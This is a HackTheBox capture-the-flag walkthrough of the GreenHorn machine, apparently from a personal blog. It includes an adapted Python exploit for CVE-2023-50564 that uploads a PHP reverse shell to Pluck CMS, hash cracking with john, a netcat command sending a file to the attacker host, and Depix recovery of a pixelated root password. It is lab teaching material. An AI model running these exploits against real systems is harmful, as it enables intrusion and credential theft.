---
title: GreenHorn
date: 2024-09-03 16:30:36 +0200
categories: [HackTheBox]
tags: [Web, Pluck, RCE, Gitea, Depix, Information Disclosure, CVE-2023-50564]
description: A vulnerable web environment with flaws in Pluck CMS and Gitea, leading to information disclosure, RCE, and privilege escalation. Exploit weak hashes and uncover hidden data to gain control.
render_with_liquid: false
media_subpath: /assets/img/htb_images/GreenHorn
image:
    path: room.webp
---

## Machine
![Room Card](room_card.png){: w="300" h="300" .center .shadow}


- **Name:** [GreenHorn](https://app.hackthebox.com/machines/GreenHorn)
- **Summary:** A vulnerable web environment with flaws in Pluck CMS and Gitea, leading to information disclosure, RCE, and privilege escalation. Exploit weak hashes and uncover hidden data to gain control.

### Author

- **Name:** [m3gakr4nus](https://app.hackthebox.com/profile/2041939)
- **Duration:** 2024-09-03 - 2024-09-03

## Initial Recon
Let's see what ports are open.
```console
m3ga@kali$ nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.11.25
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
...
```
There is a `nginx 1.18.0` webserver running **on port 80**
Let's see what's in there...

![5be1de3012fd18b673039388740e4102.png](5be1de3012fd18b673039388740e4102.png){: w="500" h="300" .center}

The IP address was replaced with the site's domain name. Let's add this to our `/etc/hosts` file.
```console
m3ga@kali$ sudoedit /etc/hosts
...
10.10.11.25 greenhorn.htb
...
```

### Pluck CMS
There are just two welcome pages. One for developers and one for the juniors.

![f5df6e3cf2c21efaea5942ce6053be62.png](f5df6e3cf2c21efaea5942ce6053be62.png){: w="700" h="300" .center}

The first thing that caught my eye was the `?file=welcome-to-greenhorn` in the URL.

![18de7a65f834d565a834104c37f312d9.png](18de7a65f834d565a834104c37f312d9.png){: w="500" h="300" .center}
> I tried fuzzing this for LFI, but I was unsuccessful
{: .prompt-warning }

### CVE-2023-50564
After some enumeration, we realize that the website is running the `Pluck CMS`.

Further enumeration leads to the discovery of the CMS version in the `/login.php` page.
![45ed9a2f581533b26ea3bcff77695c79.png](45ed9a2f581533b26ea3bcff77695c79.png){: w="400" h="300" .center}

Googling for exploits for `Pluck CMS 4.7.18`, I came across `CVE-2023-50564`.

> [nist.gov - CVE-2023-50564](https://nvd.nist.gov/vuln/detail/CVE-2023-50564)
>
> An arbitrary file upload vulnerability in the component /inc/modules_install.php of Pluck-CMS v4.7.18 allows attackers to execute arbitrary code via uploading a crafted ZIP file.
{: .prompt-info}

Luckily for me, **Rai2en** on Github already has an exploit for this vulnerability.

> [CVE-2023-50564_Pluck-v4.7.18_PoC - GitHub](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC)
>
> This repository contains a Proof of Concept for CVE-2023-50564 vulnerability in Pluck CMS version 4.7.18
{: .prompt-info}

Let's clone the repo and start exploiting...

According to the README instructions, we need to create a zip file called `payload.zip` containing a `shell.php` file.
I used the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) for this.	

```console
m3ga@kali$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
m3ga@kali$ zip "payload.zip" shell.php
```

Now, we need to replace the `<hostname>` placeholders in the `poc.py` file with our target which is `greenhorn.htb`.

The final script looks like this
```python
# Replace <hostname>
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "[REDACTED]","<username>": "","submit": "Log in"}

file_path = input("ZIP file path: ")

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("payload.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("Login account")

 
    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)

    
    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)


rce_url="http://greenhorn.htb/data/modules/payload/shell.php"

rce=requests.get(rce_url)

print(rce.text)
```

Now let's run the exploit:
```console
m3ga@kali$ python3 poc.py 
ZIP file path: ./payload.zip
Login account
ZIP file download.
File not found.
```

After running and modifying the exploit multiple times, it just didn't seem to work. I would later find out, that we need the **Pluck CMS password** for this exploit to work.

### Gitea
So I started enumerating the unusual `3000 port` that was identified by **nmap**.

Seems like `Gitea` is running on this port.

![22dcc4719995bd1c1c898a3b93b08dd9.png](22dcc4719995bd1c1c898a3b93b08dd9.png){: w="700" h="300" .center}

I created an account first to see what other repositories were here.

![8f3448b518dde59cecea78a26a68e7b6.png](8f3448b518dde59cecea78a26a68e7b6.png){: w="600" h="300" .center}

After logging in and clicking on the `Explore` section, I saw the only repository on this platform which was called "`GreenAdmin/GreenHorn`"

![b409790f6ca33b0861f65e3884468bbb.png](b409790f6ca33b0861f65e3884468bbb.png){: w="700" h="300" .center}

We also learn about the admin's email address:

![921f4700804e3322d053db259146ff01.png](921f4700804e3322d053db259146ff01.png){: w="350" h="300" .center}

Looking through this repository, I found the `pass.php` file which contains a variable called `ww`. The variable seems to be holding a hash.
 
![0a2614b4e73fe7d566030f53184fd36a.png](0a2614b4e73fe7d566030f53184fd36a.png){: w="700" h="300" .center}

## User Flag

### Reverse shell as www-data
I copied the hash and ran it through [haiti](https://github.com/noraj/haiti) to identify the hash type.
```console
m3ga@kali$ haiti 'd5443aef1b64544f3685bf112...[REDACTED]'
SHA-512 [HC: 1700] [JtR: raw-sha512]
SHA3-512 [HC: 17600] [JtR: raw-sha3]
SHA3-512 [HC: 17600] [JtR: dynamic_400]
Keccak-512 [HC: 18000] [JtR: raw-keccak]
BLAKE2-512 (blake2b) [JtR: raw-blake2]
Whirlpool [HC: 6100] [JtR: whirlpool]
...
```

The most likely hash type is `SHA-512` according to `haiti`. 

`haiti` provides the format to use with `John`, so let's try and see if this hash breaks!
```console
m3ga@kali$ echo d5443aef1b64544f3685bf112...[REDACTED] > giteapass.txt
m3ga@kali$ john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt giteapass.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]        (?)
```
The password is quickly cracked by john.

After trying the password on the **Pluck CMS**, we login successfully.
![508b69c5558bbed6c35e90229fa215ef.png](508b69c5558bbed6c35e90229fa215ef.png){: w="500" h="300" .center}

Now we should try the `poc.py` again to see if we can get a reverse shell on the system.
```console
m3ga@kali$ python3 poc.py
ZIP file path: ./payload.zip
Login account
ZIP file download.
...

connect to [10.10.16.2] from (UNKNOWN) [10.10.11.25] 53936
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 15:53:35 up  1:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$
```

The exploit finally worked and we get a reverse shell as `www-data`.

### PrivEsc to Junior
Let's see what users are on the system:
```console
$ grep --color '/bin/bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
git:x:114:120:Git Version Control,,,:/home/git:/bin/bash
junior:x:1000:1000::/home/junior:/bin/bash
```

After some enumeration, I couldn't find anything useful other than this critical privesc factor identified by `linpeas`

![05b1f8ba76f8a023b9d182ae24311047.png](05b1f8ba76f8a023b9d182ae24311047.png){: w="600" h="300" .center}

> I tried making a malicious executable and replacing the binary which the service is using, but I couldn't replace it since the service was already running and I had no permission to start/stop services. Probably a rabbit hole!
{: .prompt-warning}

I finally decided to use the **Pluck CMS** password on `Junior` and it worked...
```console
www-data@greenhorn:~$ su junior
Password: [REDACTED]
junior@greenhorn:/var/www$ cd
junior@greenhorn:~$ ls
 user.txt  'Using OpenVAS.pdf'
junior@greenhorn:~$ cat user.txt 
[REDACTED]
```

## Root Flag

### Depix
Inside `Junior`'s home directory, there is a file called `Using OpenVAS.pdf`.
Let's transfer the file to our system and see what's inside:
```console
m3ga@kali$ nc -lvnp 443 > 'Using OpenVAS.pdf' # Attacker machine
junior@greenhorn:~$ nc 10.10.16.2 443 < ./Using\ OpenVAS.pdf # Victim machine
```

It looks like the file contains an image. The image is supposed to be **the root password**, but it's pixelated.

![c84d4761bb6605dc32afcfdc6d8110aa.png](c84d4761bb6605dc32afcfdc6d8110aa.png){: w="500" h="300" .center}

Let's extract the image from the file and see what we can do with it.
```console
m3ga@kali$ pdfimages -all Using\ OpenVAS.pdf 'img'
```

This is what we get.

![a72d830d009e191b5f20ff29fd092277.png](a72d830d009e191b5f20ff29fd092277.png){: w="500" h="300" .center}

> **pdfimages** can be installed by running: `sudo apt install poppler-utils`
{: .prompt-tip}

There is a tool called [**Depix** by **spipm** on GitHub](https://github.com/spipm/Depix) which can try to reverse the pixelation process. Let's give it a try, maybe we have some luck with it.

```console
m3ga@kali$ git clone https://github.com/spipm/Depix.git
Cloning into 'Depix'...
...
m3ga@kali$ cd Depix
m3ga@kali:~/Depix$ python3 depix.py -p ../extracted_image.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o ./depixed.png
```

> The `Depix/images/searchimages/` contains a couple of pattern images that I went through and `debruinseq_notepad_Windows10_closeAndSpaced.png` is the one that worked for me.
{: .prompt-info}

The depixed image is not perfect but I could make out the one or two missing characters:
![884ac9f1009817c75193b2060cb3e550.png](884ac9f1009817c75193b2060cb3e550.png){: w="500" h="300" .center}

Let's use this long password and see if it works.
```console
junior@greenhorn:~$ su root
Password: [REDACTED]
root@greenhorn:/home/junior# cd
root@greenhorn:~# ls
cleanup.sh  restart.sh  root.txt
root@greenhorn:~# cat root.txt
[REDACTED]
```

## Outro
I would like to thank the creator of this machine [nirza](https://app.hackthebox.com/users/800960).

The room was quite fun except for all the rabbit holes. They might not have been intentional but It took me a long time to realize that they were rabbit holes.

Like I was confused on the `Using OpenVas.pdf` file. I kept looking for the "`/usr/sbin/openvas`" binary but I couldn't find it because it didn't exist. Or the writable `gitea` service binary.

Something that I learned from this machine is that pixelated images can be reversed!

\- m3gakr4nus
